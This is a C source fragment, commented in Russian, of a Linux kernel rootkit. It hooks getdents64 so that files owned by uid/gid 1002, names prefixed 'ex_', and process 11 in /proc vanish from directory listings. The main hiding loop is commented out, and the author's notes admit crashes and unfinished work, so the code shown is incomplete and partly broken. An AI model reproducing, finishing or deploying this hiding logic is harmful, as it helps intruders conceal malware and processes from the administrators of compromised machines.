/*
    скрывает по uid gid pid подстроке 
    
    Сделано только getdents64
    Надо сделать getdents

    падает, если автозапл названия ультилиты (TAB)
*/

static asmlinkage long ex_sys_getdents64(struct pt_regs *regs)
{   
    struct linux_dirent64 *kdirp; //, *ndirp;
    unsigned short is_proc = 0;                 // фс это /proc ?
    struct inode *d_inode;
	// unsigned long offset = 0;                   // смещение в массиве

    int fd = (int) regs->di;                                            // 1 парам
    struct linux_dirent64 *dirp = (struct linux_dirent64*) regs->si;    // 2 парам

	long ret = real_sys_getdents64(regs);                               // получаем содержимое директории

    if (ret <= 0) {
        return ret;
    }

    // Выделяем память заполненную 0
    kdirp = kzalloc(ret, GFP_KERNEL);
    if (kdirp == NULL) {
        return ret;
    }

    // копирует массив в ядро
    if (copy_from_user(kdirp, dirp, ret)) {
        goto out;
    }

    // Проверка на /proc (сокрытие процесса)
    /*
        current - указатель на структуру task_struct
        files - указатель на файловые дескрипторы процесса files_struct
        fdt - таблица файловых дескрипторов
        f_path - Путь к файлу (содержит dentry и inode) struct path
        dentry - Указатель на dentry, представляющий имя файла
        d_inode - указатель на структуру inode, которая содержит метаданные о файле или каталоге
    */
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    
    /*
        i_sb - указатель на super_block     struct super_block
        s_type - тип файловой системы       struct file_system_type
    */
    if (!strcmp(d_inode->i_sb->s_type->name, "proc")) {
        is_proc = 1;
    }

    /*
        Вот здесь ошибка возникает
    */

	// while (offset < ret)
	// {
	// 	ndirp = (void *)kdirp + offset;
	// 	unsigned short d_reclen = ndirp->d_reclen;

	// 	// фильтруем по uid gid подстроке или по pid
	// 	if (({
    //             // Поиск inode файла по его номеру (ndirp->d_ino) в фс, описанной суперблоком (d_inode->i_sb)

    //             struct inode *n_inode;
    //             struct list_head *pos;
    //             bool is_find = false;

    //             list_for_each(pos, &d_inode->i_sb->s_inodes) {
    //                 n_inode = list_entry(pos, struct inode, i_sb_list);
    //                 if (n_inode->i_ino == ndirp->d_ino) {
    //                     is_find = true;
    //                     break;
    //                 }
    //             }

    //             int res = is_find && (
    //                 (n_inode->i_uid.val == 1002 || n_inode->i_gid.val == 1002) || 
    //                 strncmp(ndirp->d_name, "ex_", strlen("ex_")) == 0
    //                 );

    //             res;
    //         }) || (is_proc && !strcmp(ndirp->d_name, "11"))) {
	// 		/*
	// 			ndirp  								                текущее положение в массиве
	// 			(char *)ndirp + d_reclen 					        следующий элемент массива
	// 			(char *)kdirp + ret - ((char *)ndirp + d_reclen) 	колво байт до конца массива с начала след эл
	// 		*/
	// 		memmove(ndirp, (char *)ndirp + d_reclen, (char *)kdirp + ret - ((char *)ndirp + d_reclen));
	// 		ret -= d_reclen;
	// 		memset((char *)kdirp + ret, 0, d_reclen);
            
	// 		continue;
	// 	}

	// 	offset += d_reclen;
	// }
	
	// if (copy_to_user(dirp, kdirp, ret)) {
	// 	goto out;
	// }

out:
    kfree(kdirp);
	return ret;
}